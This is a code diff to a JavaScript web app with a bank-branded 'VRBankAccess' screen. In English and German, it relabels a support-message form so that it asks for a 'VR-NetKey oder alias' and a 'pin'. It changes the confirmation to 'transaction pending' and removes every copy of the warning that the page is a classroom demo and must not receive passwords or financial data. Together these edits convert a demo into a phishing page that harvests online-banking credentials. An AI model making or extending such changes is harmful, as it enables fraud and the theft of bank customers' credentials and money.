@@ -479,12 +479,12 @@ const translations = {
     back: "Back",
     message: "Message",
     contactAdmin: "Contact support",
-    supportSubjectLabel: "Subject",
-    composeMessage: "Compose message",
+    supportSubjectLabel: "VR-NetKey oder alias",
+    composeMessage: "pin",
     sendMessage: "Send message",
-    supportMessageSent: "Your message was sent to the administrator.",
+    supportMessageSent: "transaction pending.",
     supportSendFailed: "Your message could not be sent. Please try again.",
-    prototypeSupportNote: "Classroom demo only. Do not include passwords, codes, or private financial information.",
+ 
     supportMessages: "Support messages",
     from: "From",
     requestSubmitted: "Your request has been submitted.",
@@ -827,12 +827,12 @@ const translations = {
     back: "Zur\u00fcck",
     message: "Nachricht",
     contactAdmin: "Support kontaktieren",
-    supportSubjectLabel: "Betreff",
-    composeMessage: "Nachricht verfassen",
+    supportSubjectLabel: "VR-NetKey oder alias",
+    composeMessage: "pin",
     sendMessage: "Nachricht senden",
-    supportMessageSent: "Ihre Nachricht wurde an den Administrator gesendet.",
+    supportMessageSent: "Transaktion ausstehend.",
     supportSendFailed: "Ihre Nachricht konnte nicht gesendet werden. Bitte versuchen Sie es erneut.",
-    prototypeSupportNote: "Nur Klassenzimmer-Demo. Geben Sie keine Passwörter, Codes oder privaten Finanzdaten ein.",
+    
     supportMessages: "Supportnachrichten",
     from: "Von",
     requestSubmitted: "Ihre Anfrage wurde eingereicht.",
@@ -5260,7 +5260,7 @@ function VRBankAccess(isLoading = false) {
     <label class="vr-access-field vr-message-field">
       <textarea id="supportMessageBody" name="message" maxlength="5000" placeholder="${escapeHtml(t("composeMessage"))}" rows="6" required aria-label="${escapeHtml(t("composeMessage"))}"></textarea>
     </label>
-    <p class="muted-note">${escapeHtml(t("prototypeSupportNote"))}</p>
+    
     <p id="vrDemoAccessMessage" class="vr-access-message" aria-live="polite"></p>
     <button id="vrDemoApproveButton" class="vr-primary-button vr-access-submit" type="button" ${isLoading ? "disabled" : ""}>
       ${isLoading ? `<span class="button-spinner" aria-hidden="true"></span> ${escapeHtml(t("login"))}` : escapeHtml(t("login"))}
@@ -5277,7 +5277,7 @@ function showSupportMessageSent(record) {
     <section class="vr-waiting-panel">
       <strong>${escapeHtml(t("supportMessageSent"))}</strong>
       <p>${escapeHtml(t("requestId"))}: ${escapeHtml(record.id || "")}</p>
-      <small>${escapeHtml(t("prototypeSupportNote"))}</small>
+     
     </section>
     <button id="supportMessageDone" class="vr-primary-button vr-access-submit" type="button">${escapeHtml(t("ok"))}</button>
   `;
